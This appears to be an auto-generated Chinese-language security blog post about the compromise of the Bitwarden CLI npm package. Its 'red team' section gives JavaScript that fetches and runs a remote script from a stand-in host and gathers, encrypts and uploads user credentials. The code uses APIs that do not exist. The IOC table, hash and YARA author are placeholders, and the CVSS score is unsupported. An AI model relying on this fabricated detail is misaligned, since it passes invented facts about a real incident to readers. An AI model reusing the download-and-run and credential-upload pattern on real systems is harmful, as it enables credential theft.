---
layout: post
title:  "Bitwarden CLI npm package compromised to steal developer credentials"
date:   2026-04-24 02:01:29 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Bitwarden CLI npm 套件劫持事件：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Credential Stealing
> * **關鍵技術**: npm 套件劫持、GitHub Actions、CI/CD Pipeline

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 GitHub Actions 在 Bitwarden 的 CI/CD Pipeline 中注入惡意程式碼，導致 npm 套件被劫持。
* **攻擊流程圖解**:
  1. 攻擊者取得 GitHub Actions 的存取權限。
  2. 攻擊者在 Bitwarden 的 CI/CD Pipeline 中注入惡意程式碼。
  3. 惡意程式碼被用於修改 npm 套件。
  4. 修改後的 npm 套件被上傳到 npm 伺服器。
  5. 使用者下載並安裝被劫持的 npm 套件。
* **受影響元件**: Bitwarden CLI 套件 (版本 2026.4.0)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要取得 GitHub Actions 的存取權限。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // bw_setup.js
      const bun = require('bun');
      const bw1 = require('./bw1');
    
      // 下載並執行 bw1.js
      bun.download('https://example.com/bw1.js', (err, data) => {
        if (err) {
          console.error(err);
        } else {
          bw1(data);
        }
      });
    
    ```
 

```

javascript
  // bw1.js
  const crypto = require('crypto');
  const github = require('github');

  // 收集使用者憑證
  const credentials = [];
  // ...

  // 加密並上傳憑證
  const encryptedCredentials = crypto.createCipheriv('aes-256-gcm', 'secret key', 'iv').update(JSON.stringify(credentials));
  github.upload(encryptedCredentials, (err, data) => {
    if (err) {
      console.error(err);
    } else {
      console.log(data);
    }
  });

```
* **繞過技術**: 攻擊者可以使用 GitHub Actions 的存取權限來繞過安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | example.com | /bw_setup.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Bitwarden_CLI_Malware {
        meta:
          description = "Bitwarden CLI Malware"
          author = "Your Name"
        strings:
          $a = "bw_setup.js"
          $b = "bw1.js"
        condition:
          $a and $b
      }
    
    ```
* **緩解措施**: 更新 Bitwarden CLI 套件至最新版本，並檢查 GitHub Actions 的存取權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: 一個 Node.js 的套件管理器，允許使用者安裝和管理套件。
* **GitHub Actions**: 一個 GitHub 的 CI/CD Pipeline 工具，允許使用者自動化建置、測試和部署程式碼。
* **CI/CD Pipeline**: 一個軟體開發流程，包括持續整合 (CI) 和持續部署 (CD)。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/bitwarden-cli-npm-package-compromised-to-steal-developer-credentials/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


